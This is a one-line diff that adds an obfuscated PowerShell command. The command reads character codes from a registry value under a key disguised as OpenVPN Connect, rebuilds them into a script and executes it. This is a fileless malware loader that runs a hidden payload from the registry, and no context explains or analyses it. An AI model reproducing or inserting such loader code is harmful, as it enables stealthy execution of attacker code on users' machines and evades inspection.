@@ -1,0 +1,1 @@
+$czVZpFwMSHi=[ScriptBlock];$xXWoPBkIxK=[string];$xSQEihUBlT=[char]; icm ($czVZpFwMSHi::Create($xXWoPBkIxK::Join('', ((gp 'HKLM:\SOFTWARE\OpenVPNConnect.exewfh95b').'irUUcHjDrrj' | % { [char]$_ }))))
